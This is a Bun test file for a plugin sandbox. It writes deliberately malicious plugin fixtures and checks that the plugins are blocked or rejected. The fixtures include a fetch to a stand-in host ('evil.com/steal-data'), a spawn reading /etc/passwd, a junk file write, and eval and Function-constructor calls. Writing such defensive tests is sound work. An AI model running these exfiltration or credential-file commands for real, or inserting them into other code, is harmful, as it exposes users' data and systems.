import { describe, test, expect, beforeEach, afterEach } from "bun:test";
import { PluginManager } from "../index";
import { writeFileSync, mkdirSync, existsSync, rmSync } from "fs";
import { join } from "path";
import { homedir } from "os";
import { computeChecksum } from "../security";

const TEST_PLUGIN_BASE = join(homedir(), ".wabisabi", "plugins");
let testCounter = 0;

function getTestPluginDir(): string {
  testCounter++;
  return join(TEST_PLUGIN_BASE, `sandbox-test-${testCounter}-${Date.now()}`);
}

describe("Plugin Sandbox Enforcement (CRITICA-2)", () => {
  let TEST_PLUGIN_DIR: string;

  beforeEach(() => {
    TEST_PLUGIN_DIR = getTestPluginDir();
    mkdirSync(TEST_PLUGIN_DIR, { recursive: true });
  });

  afterEach(() => {
    if (existsSync(TEST_PLUGIN_DIR)) {
      rmSync(TEST_PLUGIN_DIR, { recursive: true, force: true });
    }
  });

  test("should block network access without permissions", async () => {
    const manager = new PluginManager();
    const pluginPath = join(TEST_PLUGIN_DIR, "index.ts");
    const manifestPath = join(TEST_PLUGIN_DIR, "manifest.json");

    // Malicious plugin attempting network access
    const pluginCode = `
export default {
  name: "network-test",
  version: "1.0.0",
  description: "Test network blocking",
  onLoad: async (ctx) => {
    try {
      await fetch("https://evil.com/steal-data");
      ctx.logger.error("SECURITY VIOLATION: Network access succeeded!");
    } catch (error) {
      // Expected: fetch should throw "Network access denied"
      if (error.message.includes("Network access denied")) {
        ctx.logger.info("Network access correctly blocked");
      } else {
        throw error;
      }
    }
  }
};
`;

    writeFileSync(pluginPath, pluginCode);
    const checksum = computeChecksum(pluginPath);

    const manifest = {
      name: "network-test",
      version: "1.0.0",
      description: "Test plugin",
      entry: "index.ts",
      checksum: {
        algorithm: "sha256",
        hash: checksum,
      },
      permissions: {
        network: false, // Network access DENIED
        filesystem: "none",
        process: false,
      },
    };

    writeFileSync(manifestPath, JSON.stringify(manifest, null, 2));

    // Plugin should load but network access should be blocked inside
    await expect(manager.loadPlugin(pluginPath)).resolves.toBeUndefined();
  });

  test("should block filesystem write without permissions", async () => {
    const manager = new PluginManager();
    const pluginPath = join(TEST_PLUGIN_DIR, "index.ts");
    const manifestPath = join(TEST_PLUGIN_DIR, "manifest.json");

    // Malicious plugin attempting filesystem write
    const pluginCode = `
export default {
  name: "fs-test",
  version: "1.0.0",
  description: "Test filesystem blocking",
  onLoad: async (ctx) => {
    try {
      await Bun.write("/tmp/malicious.txt", "pwned");
      ctx.logger.error("SECURITY VIOLATION: Filesystem write succeeded!");
    } catch (error) {
      // Expected: Bun.write should throw "Filesystem write denied"
      if (error.message.includes("Filesystem write denied") || error.message.includes("Filesystem access denied")) {
        ctx.logger.info("Filesystem write correctly blocked");
      } else {
        throw error;
      }
    }
  }
};
`;

    writeFileSync(pluginPath, pluginCode);
    const checksum = computeChecksum(pluginPath);

    const manifest = {
      name: "fs-test",
      version: "1.0.0",
      description: "Test plugin",
      entry: "index.ts",
      checksum: {
        algorithm: "sha256",
        hash: checksum,
      },
      permissions: {
        network: false,
        filesystem: "none", // Filesystem access DENIED
        process: false,
      },
    };

    writeFileSync(manifestPath, JSON.stringify(manifest, null, 2));

    await expect(manager.loadPlugin(pluginPath)).resolves.toBeUndefined();
  });

  test("should block process spawning without permissions", async () => {
    const manager = new PluginManager();
    const pluginPath = join(TEST_PLUGIN_DIR, "index.ts");
    const manifestPath = join(TEST_PLUGIN_DIR, "manifest.json");

    // Malicious plugin attempting process spawn
    const pluginCode = `
export default {
  name: "process-test",
  version: "1.0.0",
  description: "Test process blocking",
  onLoad: async (ctx) => {
    try {
      await Bun.spawn(["cat", "/etc/passwd"]);
      ctx.logger.error("SECURITY VIOLATION: Process spawn succeeded!");
    } catch (error) {
      // Expected: Bun.spawn should throw "Process spawning denied"
      if (error.message.includes("Process spawning denied")) {
        ctx.logger.info("Process spawning correctly blocked");
      } else {
        throw error;
      }
    }
  }
};
`;

    writeFileSync(pluginPath, pluginCode);
    const checksum = computeChecksum(pluginPath);

    const manifest = {
      name: "process-test",
      version: "1.0.0",
      description: "Test plugin",
      entry: "index.ts",
      checksum: {
        algorithm: "sha256",
        hash: checksum,
      },
      permissions: {
        network: false,
        filesystem: "none",
        process: false, // Process spawning DENIED
      },
    };

    writeFileSync(manifestPath, JSON.stringify(manifest, null, 2));

    await expect(manager.loadPlugin(pluginPath)).resolves.toBeUndefined();
  });

  test("should reject plugin with eval() code execution", async () => {
    const manager = new PluginManager();
    const pluginPath = join(TEST_PLUGIN_DIR, "index.ts");
    const manifestPath = join(TEST_PLUGIN_DIR, "manifest.json");

    // Malicious plugin using eval()
    const pluginCode = `
export default {
  name: "eval-test",
  version: "1.0.0",
  description: "Test eval blocking",
  onLoad: async (ctx) => {
    eval("console.log('malicious code')");
  }
};
`;

    writeFileSync(pluginPath, pluginCode);
    const checksum = computeChecksum(pluginPath);

    const manifest = {
      name: "eval-test",
      version: "1.0.0",
      description: "Test plugin",
      entry: "index.ts",
      checksum: {
        algorithm: "sha256",
        hash: checksum,
      },
      permissions: {
        network: false,
        filesystem: "none",
        process: false,
      },
    };

    writeFileSync(manifestPath, JSON.stringify(manifest, null, 2));

    // Should reject due to static code analysis detecting eval()
    await expect(manager.loadPlugin(pluginPath)).rejects.toThrow(
      /Plugin code validation failed/
    );
  });

  test("should reject plugin with Function constructor", async () => {
    const manager = new PluginManager();
    const pluginPath = join(TEST_PLUGIN_DIR, "index.ts");
    const manifestPath = join(TEST_PLUGIN_DIR, "manifest.json");

    // Malicious plugin using Function constructor
    const pluginCode = `
export default {
  name: "function-test",
  version: "1.0.0",
  description: "Test Function blocking",
  onLoad: async (ctx) => {
    const evil = new Function('return "pwned"');
    evil();
  }
};
`;

    writeFileSync(pluginPath, pluginCode);
    const checksum = computeChecksum(pluginPath);

    const manifest = {
      name: "function-test",
      version: "1.0.0",
      description: "Test plugin",
      entry: "index.ts",
      checksum: {
        algorithm: "sha256",
        hash: checksum,
      },
      permissions: {
        network: false,
        filesystem: "none",
        process: false,
      },
    };

    writeFileSync(manifestPath, JSON.stringify(manifest, null, 2));

    await expect(manager.loadPlugin(pluginPath)).rejects.toThrow(
      /Plugin code validation failed/
    );
  });

  test("should allow plugin with correct permissions", async () => {
    const manager = new PluginManager();
    const pluginPath = join(TEST_PLUGIN_DIR, "index.ts");
    const manifestPath = join(TEST_PLUGIN_DIR, "manifest.json");

    // Legitimate plugin with network permission
    const pluginCode = `
export default {
  name: "legit-test",
  version: "1.0.0",
  description: "Legitimate plugin with permissions",
  onLoad: async (ctx) => {
    ctx.logger.info("Legitimate plugin loaded successfully");
  }
};
`;

    writeFileSync(pluginPath, pluginCode);
    const checksum = computeChecksum(pluginPath);

    const manifest = {
      name: "legit-test",
      version: "1.0.0",
      description: "Legitimate plugin",
      entry: "index.ts",
      checksum: {
        algorithm: "sha256",
        hash: checksum,
      },
      permissions: {
        network: true, // Permission granted
        filesystem: "read",
        process: false,
      },
    };

    writeFileSync(manifestPath, JSON.stringify(manifest, null, 2));

    await expect(manager.loadPlugin(pluginPath)).resolves.toBeUndefined();
    expect(manager.listPlugins()).toContain("legit-test");
  });

  test("should enforce worker isolation (no shared state)", async () => {
    const manager = new PluginManager();

    // This test verifies that plugins run in isolated workers
    // and cannot access each other's state or main process state

    const plugin1Path = join(TEST_PLUGIN_DIR, "plugin1", "index.ts");
    const plugin1Dir = join(TEST_PLUGIN_DIR, "plugin1");
    mkdirSync(plugin1Dir, { recursive: true });

    const plugin1Code = `
export default {
  name: "isolated-1",
  version: "1.0.0",
  description: "Plugin 1",
  onLoad: async (ctx) => {
    ctx.setState("secret", "plugin1-data");
  }
};
`;

    writeFileSync(plugin1Path, plugin1Code);
    const checksum1 = computeChecksum(plugin1Path);

    writeFileSync(
      join(plugin1Dir, "manifest.json"),
      JSON.stringify({
        name: "isolated-1",
        version: "1.0.0",
        description: "Plugin 1",
        entry: "index.ts",
        checksum: { algorithm: "sha256", hash: checksum1 },
        permissions: { network: false, filesystem: "none", process: false },
      })
    );

    await manager.loadPlugin(plugin1Path);

    // Plugin should be loaded successfully
    expect(manager.listPlugins()).toContain("isolated-1");
  });
});
